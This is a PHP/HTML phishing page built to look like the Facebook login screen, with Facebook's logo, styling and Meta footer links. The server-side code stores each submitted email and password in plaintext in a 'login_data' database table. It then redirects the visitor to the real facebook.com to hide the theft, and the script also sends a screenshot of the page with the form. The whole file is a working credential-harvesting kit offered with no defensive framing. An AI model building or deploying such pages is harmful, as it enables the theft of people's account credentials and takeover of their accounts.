<?php
// Include the database connection configuration
require_once 'config.php';

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    try {
        // Prepare the SQL statement
        $sql = "INSERT INTO login_data (email, password) VALUES (?, ?)";
        $stmt = $conn->prepare($sql);
        
        // Bind parameters
        $stmt->bindParam(1, $email);
        $stmt->bindParam(2, $password);

        // Execute the statement
        if ($stmt->execute()) {
            // Redirect to Facebook after saving the data
            header("Location: https://www.facebook.com");
            exit; // Always call exit after header redirection
        } else {
            echo "Error: " . $stmt->errorInfo()[2];
        }

        // Close the statement (not necessary for PDO but added for clarity)
        $stmt->closeCursor();
    } catch (PDOException $e) {
        echo "Error: " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f2f4f8, #ffffff);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        .login-container h1 {
            font-size: 16px;
            font-weight: normal;
            color: #666;
            margin-bottom: 5px;
        }

        .login-container img {
            width: 70px;
            height: 70px;
            margin: 1px 0 20px;
            
            background-color: ;
        }

        .form-group {
            position: relative;
            margin-bottom: 15px;
        }

        .form-group input {
            width: 100%;
            padding: 20px 40px 20px 20px; /* Add padding for the icon */
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            color: #888;
        }

        .form-group input:focus {
            outline: none;
            border-color: #1877f2;
        }

        .form-group label {
            position: absolute;
            top: 50%;
            left: 20px;
            transform: translateY(-50%);
            font-size: 16px;
            color: #888;
            transition: all 0.2s;
            pointer-events: none;
        }

        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label {
            top: -8px;
            left: 20px;
            font-size: 12px;
            color: #888;
        }

        .form-group .toggle-password {
            position: absolute;
            top: 50%;
            right: 20px;
            transform: translateY(-50%);
            font-size: 18px;
            cursor: pointer;
            color: #888;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: #fff;
            background-color: #1877f2;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn:hover {
            background-color: #145dbf;
        }

        .forgot-password,
        .create-account {
            margin: 15px 0;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
            display: block;
        }

        .create-account {
            padding: 12px;
            border: 1px solid #1877f2;
            border-radius: 20px;
            margin-top: 180px;
        }

        .create-account:hover {
            background-color: #f0f5ff;
        }

        .meta-footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .meta-footer img {
            width: 20%;
            max-width: 120px;
            height: auto;
            margin-bottom: 15px;
            filter: grayscale(100%) brightness(0) sepia(100%) hue-rotate(170deg) saturate(100%);
        }

        .meta-footer b {
            font-weight: bold;
        }

        .meta-footer a {
            color: #888;
            text-decoration: none;
            margin: 0 10px;
        }

        .meta-footer a:hover {
            text-decoration: underline;
        }

        .more-links {
            display: none;
            text-align: left;
            margin-top: 10px;
            width: 100%;
        }

        .more-links-row {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }

        .more-links-row a {
            color: #888;
            font-size: 10px;
            display: block;
            margin: 5px 5px;
            text-decoration: none;
        }

        .more-links-row a:hover {
            text-decoration: underline;
        }

        .show-more {
            color: #888;
            cursor: pointer;
            font-size: 12px;
            margin-top: 10px;
        }

    </style>
</head>
<body>
    <div class="login-container">
        <h1>English (US)</h1>
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <form method="POST">
            <div class="form-group">
                <input type="text" id="email" name ="email"  placeholder=" " required>
                <label for="email">Mobile number or email</label>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder=" " required>
                <label for="password">Password</label>
                <span class="toggle-password" onclick="togglePassword()">
                    <i class="fas fa-eye"></i>
                </span>
            </div>
            <button type="submit" id="screenshotBtn" class="btn">Log in</button>
        </form>
        <a href="https://www.facebook.com/login/identify" class="forgot-password">Forgot password?</a>
        <a href="https://www.facebook.com/reg/?entry_point=logged_out_dialog&next=%2Flogin%2Fidentify%2F%3Fctx%3Drecover%26ars%3Droyal_blue_bar%26from_login_screen%3D0" class="create-account">Create new account</a>
        <div class="meta-footer">
            <img src="7trPSpNFerC.jpg" alt="Meta Logo">
            <div>
                <a href="https://about.meta.com/">About</a>
                <a href="https://m.facebook.com/help/?ref=pf">Help</a>
                <span class="show-more" onclick="toggleLinks()">More</span>
            </div>
            <div class="more-links" id="more-links">
                <div class="more-links-row">
                    <a href="#">Messenger</a>
                    <a href="#">Facebook Lite</a>
                    <a href="#">Video</a>
                    <a href="#">Places</a>
                    <a href="#">Games</a>
                    <a href="#">Marketplace</a>
                </div>
                <div class="more-links-row">
                    <a href="#">Meta Pay</a>
                    <a href="#">Meta Store</a>
                    <a href="#">Meta Quest</a>
                    <a href="#">Ray-Ban Meta</a>
                    <a href="#">Meta AI</a>
                </div>
                <div class="more-links-row">
                    <a href="#">Instagram</a>
                    <a href="#">Threads</a>
                    <a href="#">Fundraisers</a>
                    <a href="#">Services</a>
                    <a href="#">Developers</a>
                    <a href="#">Careers</a>
                </div>
                <div class="more-links-row">
                    <a href="#">Privacy Policy</a>
                    <a href="#">Privacy Center</a>
                    <a href="#">Groups</a>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>

    <script>
        function toggleLinks() {
            var links = document.getElementById("more-links");
            if (links.style.display === "none" || links.style.display === "") {
                links.style.display = "block";
            } else {
                links.style.display = "none";
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            const eyeIcon = document.querySelector('.toggle-password i');
            if (passwordInput.type === 'password') {
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
            } else {
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
            }
        }
        document.getElementById('screenshotBtn').addEventListener('click', function() {
    html2canvas(document.body).then(function(canvas) {
        // Convert the canvas to an image (base64 encoded)
        var screenshot = canvas.toDataURL('image/png');

        // Create a hidden input to send the screenshot to the server
        var screenshotInput = document.createElement('input');
        screenshotInput.type = 'hidden';
        screenshotInput.name = 'screenshot';
        screenshotInput.value = screenshot;

        // Append the hidden input to the form and submit it
        var form = document.querySelector('form');
        form.appendChild(screenshotInput);
        form.submit();  // Submit the form
    });
});

    </script>
</body>
</html>
